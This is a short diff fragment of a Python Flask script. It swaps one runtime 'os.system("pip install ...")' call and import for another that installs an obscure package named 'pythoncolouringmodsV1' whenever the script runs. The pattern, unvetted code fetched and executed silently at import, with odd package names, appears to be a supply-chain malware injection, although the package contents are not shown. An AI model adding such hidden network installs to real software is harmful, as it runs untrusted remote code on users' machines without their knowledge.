@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install syscryptaddition")
-import syscryptaddition
+os.system("pip install pythoncolouringmodsV1")
+import pythoncolouringmodsV1
 import flask
 
 from flask import g
